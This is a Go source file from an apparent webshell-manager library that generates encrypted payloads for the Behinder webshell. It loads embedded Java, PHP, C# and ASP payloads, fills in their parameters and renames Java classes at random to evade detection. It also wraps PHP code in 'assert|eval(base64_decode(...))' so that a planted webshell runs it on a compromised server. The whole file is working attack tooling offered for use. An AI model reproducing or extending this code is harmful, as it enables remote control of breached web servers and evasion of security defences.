package behinder

import (
	"encoding/base64"
	"errors"
	"fmt"
	"github.com/go0p/wsm/lib/dynamic"
	"github.com/go0p/wsm/lib/payloads"
	"github.com/go0p/wsm/lib/shell"
	"regexp"
	"strconv"
	"strings"
)

func GetPayload(key []byte, className string, params map[string]string, types shell.ScriptType, encryptType int) ([]byte, error) {
	var bincls []byte
	var err error
	if types == shell.JavaScript || types == shell.JspxScript {
		bincls, err = getParamedClass(className, params)
		if err != nil {
			return nil, err
		}
		//if (extraData != null) {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		encrypedBincls, err := encryptForJava(bincls, key)
		if err != nil {
			return nil, err
		}
		return []byte(base64.StdEncoding.EncodeToString(encrypedBincls)), nil
	} else if types == shell.PhpScript {
		bincls, err = getParamedPhp(className, params)
		if err != nil {
			return nil, err
		}
		bincls = []byte(base64.StdEncoding.EncodeToString(bincls))
		//bincls = []byte(("lasjfadfas.assert|eval(base64_decode('" + string(bincls) + "'));"))
		bincls = []byte(("assert|eval(base64_decode('" + string(bincls) + "'));"))
		//if extraData != null {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		encrypedBincls, err := encryptForPhp(bincls, key, encryptType)
		if err != nil {
			return nil, err
		}
		return []byte(base64.StdEncoding.EncodeToString(encrypedBincls)), nil
	} else if types == shell.CsharpScript {
		bincls, err = GetParamedAssembly(className, params)
		if err != nil {
			return nil, err
		}
		//if (extraData != null) {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		encrypedBincls, err := encryptForCSharp(bincls, key)
		if err != nil {
			return nil, err
		}
		return encrypedBincls, nil
	} else if types == shell.AspScript {
		bincls, err = GetParamedAsp(className, params)
		if err != nil {
			return nil, err
		}
		//if (extraData != null) {
		//	bincls = CipherUtils.mergeByteArray(bincls, extraData);
		//}
		xx := encryptForAsp(bincls, key)
		return xx, nil
	} else {
		return nil, errors.New(fmt.Sprintf("get %s payload error", types))
	}
}

func getParamedClass(clsName string, params map[string]string) ([]byte, error) {
	payloadBytes, err := payloads.BehinderClassPayloads.ReadFile(fmt.Sprintf("behinder/java/%s.class", clsName))
	if err != nil {
		return nil, err
	}
	for k, v := range params {
		payloadBytes, err = dynamic.ReplaceClassStrVar(payloadBytes, k, v)
		if err != nil {
			return nil, err
		}
	}
	result := payloadBytes
	if len(result) == 0 {
		return nil, errors.New("payload is empty")
	}
	oldClassName := fmt.Sprintf("net/behinder/payload/java/%s", clsName)
	if clsName != "LoadNativeLibraryGo" {
		newClassName := dynamic.RandomClassName()
		result = dynamic.ReplaceClassName(result, oldClassName, newClassName)
	}
	// 修改为Jdk 1.5 冰蝎原版是 50(1.6),测了几下发现 49(1.5) 也行，不知道有没有 bug
	result[7] = 49
	return result, nil
}

func keySet(m map[string]string) []string {
	// 数组默认长度为map长度,后面append时,不需要重新申请内存和拷贝,效率很高
	j := 0
	keys := make([]string, len(m))
	for k := range m {
		keys[j] = k
		j++
	}
	return keys
}

func getParamedPhp(clsName string, params map[string]string) ([]byte, error) {
	var code strings.Builder
	payloadBytes, err := payloads.BehinderPhpPayloads.ReadFile(fmt.Sprintf("behinder/php/%s.php.txt", clsName))
	if err != nil {
		return nil, err
	}
	code.WriteString(string(payloadBytes))
	paraList := ""
	paramsList := getPhpParams(payloadBytes)
	for _, paraName := range paramsList {
		if dynamic.InStrSlice(keySet(params), paraName) {
			paraValue := params[paraName]
			paraValue = base64.StdEncoding.EncodeToString([]byte(paraValue))
			code.WriteString(fmt.Sprintf("$%s=\"%s\";$%s=base64_decode($%s);", paraName, paraValue, paraName, paraName))
			paraList = paraList + ",$" + paraName
		} else {
			code.WriteString(fmt.Sprintf("$%s=\"%s\";", paraName, ""))
			paraList = paraList + ",$" + paraName
		}
	}

	paraList = strings.Replace(paraList, ",", "", 1)
	code.WriteString("\r\nmain(" + paraList + ");")
	return []byte(code.String()), nil
}

// 获取 php 代码中需要更改的 params
func getPhpParams(phpPayload []byte) []string {
	paramList := make([]string, 0, 2)
	mainRegex := regexp.MustCompile(`main\s*\([^)]*\)`)
	mainMatch := mainRegex.Match(phpPayload)
	mainStr := mainRegex.FindStringSubmatch(string(phpPayload))

	if mainMatch && len(mainStr) > 0 {
		paramRegex := regexp.MustCompile(`\$([a-zA-Z]*)`)
		//paramMatch := paramRegex.FindStringSubmatch(mainStr[0])
		paramMatch := paramRegex.FindAllStringSubmatch(mainStr[0], -1)
		if len(paramMatch) > 0 {
			for _, v := range paramMatch {
				paramList = append(paramList, v[1])
			}
		}
	}

	return paramList
}

func GetParamedAssembly(clsName string, params map[string]string) ([]byte, error) {
	payloadBytes, err := payloads.BehinderCsharpPayloads.ReadFile(fmt.Sprintf("behinder/csharp/%s.dll", clsName))
	if err != nil {
		return nil, err
	}
	if len(keySet(params)) == 0 {
		return payloadBytes, nil
	} else {
		paramsStr := ""
		var paramName, paramValue string
		for key := range params {
			paramName = key
			paramValue = base64.StdEncoding.EncodeToString([]byte(params[paramName]))
			paramsStr = paramsStr + paramName + ":" + paramValue + ","
		}
		paramsStr = paramsStr[0 : len(paramsStr)-1]
		token := "~~~~~~" + paramsStr
		return dynamic.MergeBytes(payloadBytes, []byte(token)), nil
	}
}

func GetParamedAsp(clsName string, params map[string]string) ([]byte, error) {
	var code strings.Builder
	payloadBytes, err := payloads.BehinderAspPayloads.ReadFile(fmt.Sprintf("behinder/asp/%s.asp.txt", clsName))
	if err != nil {
		return nil, err
	}
	code.WriteString(string(payloadBytes))
	paraList := ""
	if len(params) > 0 {
		paraList = paraList + "Array("
		for _, paramValue := range params {
			var paraValueEncoded string
			for _, v := range paramValue {
				//fmt.Println(v)
				paraValueEncoded = paraValueEncoded + "chrw(" + strconv.Itoa(int(v)) + ")&"
				//fmt.Println(paraValueEncoded)
			}
			paraValueEncoded = strings.TrimRight(paraValueEncoded, "&")
			paraList = paraList + "," + paraValueEncoded
		}
		paraList = paraList + ")"
	}
	paraList = strings.Replace(paraList, ",", "", 1)
	code.WriteString("\r\nmain " + paraList + "")
	return []byte(code.String()), nil
}
